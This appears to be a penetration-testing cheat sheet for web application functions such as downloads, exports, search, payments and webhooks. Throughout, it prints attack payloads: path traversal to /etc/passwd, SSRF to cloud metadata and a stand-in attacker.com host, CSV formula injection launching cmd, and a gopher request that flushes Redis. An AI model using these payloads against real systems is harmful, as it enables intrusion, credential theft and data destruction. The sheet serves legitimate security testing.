# Application Functions Security Testing

## Overview
Security testing of specific application functionalities: file operations, export features, payment flows, notifications, and more.

## File Upload Testing
```
# See insecure_file_uploads.md for full coverage
# Quick checklist:
# - Upload PHP/ASP/JSP with image extension
# - Magic bytes bypass
# - Path traversal in filename
# - XML/SVG with XXE
# - ZIP slip attacks
```

## File Download / Export
```
# Path traversal in download
GET /download?file=report.pdf → /download?file=../../etc/passwd
GET /export?path=data.csv → /export?path=/var/www/config.php

# SSRF via URL-based download
POST /download-url
{"url": "https://attacker.com/file.pdf"}  → SSRF
{"url": "file:///etc/passwd"}
{"url": "http://169.254.169.254/"}

# Insecure Direct Object Reference in downloads
GET /download?id=1234 → change id to access other users' files

# CSV/Excel injection
# If user data exported to CSV/Excel:
Malicious data: =cmd|'/c calc'!A0
+HYPERLINK("http://attacker.com","click")
@SUM(1+1)*cmd|' /c calc'!A0

# PDF generation injection
# See ssrf.md for SSRF via PDF generation
```

## Search Functionality
```
# SQL injection in search
# XSS in search results
# ReDoS (Regular Expression DoS)
# Regex: (a+)+ with input: aaaaaaaaaaaaaaaaaaaaaaaaaaaa!

# Search result information disclosure
# Can search return admin users, other users' data?
# Wildcard search: * or % to return everything

# NoSQL injection in search
{"$where": "this.username == 'admin'"}
{"search": {"$regex": ".*"}}
```

## Notification / Email Functions
```
# HTML injection in email notifications
# XSS if notifications rendered in webview
# SSRF via image URL in notifications

# Email header injection (see email_attacks.md)
# Template injection in email templates (see ssti.md)

# Notification endpoint IDOR
# Can you trigger notifications for other users?
PUT /api/notifications/settings/victim_id
```

## Payment / E-commerce Functions
```
# Price manipulation
# Negative quantity: quantity=-1 → refund?
# Zero price: price=0.00
# Price in request body (not server-side validated)
{"price": 0.01, "quantity": 1, "total": 0.01}  # bypass total validation

# Currency/locale attacks
# Price in EUR vs USD vs BTC
# Comma vs period decimal separator
price=1,00 (European: 1.00) vs price=100 (American: 100)

# Coupon abuse
# Apply same coupon multiple times
# Race condition on coupon redemption
# Negative coupon value

# Order manipulation
# Change order status: pending → completed
# Modify order items after payment
# IDOR: access/modify other orders

# Payment flow bypass
# Skip payment step, go directly to order confirmation
# Replay old successful payment token
```

## Admin / Debug Functions
```
# Admin panel discovery
/admin, /administrator, /backend, /manage, /dashboard, /console
/debug, /test, /dev, /staging, /_admin, /system

# Debug parameters
?debug=true, ?test=1, ?dev=1, ?verbose=1
?trace=true, ?profiler=true

# Exposed development endpoints
/phpinfo.php, /info.php, /.git/, /.env
/config.php.bak, /web.config.bak, /backup/
```

## Import / Bulk Operations
```
# Bulk operations IDOR
# Import CSV: can you import records for other accounts?
# Bulk delete: delete IDs you don't own
# Bulk update: mass update other users' data

# CSV import injection
# XML import XXE
# JSON/YAML import deserialization
# ZIP file: zip slip attack
```

## WebHook / Callback Functions
```
# SSRF via webhook URL
POST /api/webhooks
{"url": "http://169.254.169.254/latest/meta-data/"}

# Test if URL is validated
{"url": "file:///etc/passwd"}
{"url": "gopher://127.0.0.1:6379/_FLUSHALL"}  # Redis via webhook

# Webhook content injection
# Can you make webhook send crafted payloads?
# SSRF chained with webhook response
```

## Testing Methodology
1. Map all application functions
2. For each function, test:
   - Authorization (can other users trigger/access?)
   - Input validation (injection, traversal)
   - Business logic (price, quantity, flow bypass)
   - Information disclosure (what data is returned?)
3. Test export/download for path traversal and SSRF
4. Test payment flows for logic flaws
5. Test search for injection and information disclosure
6. Test webhooks for SSRF
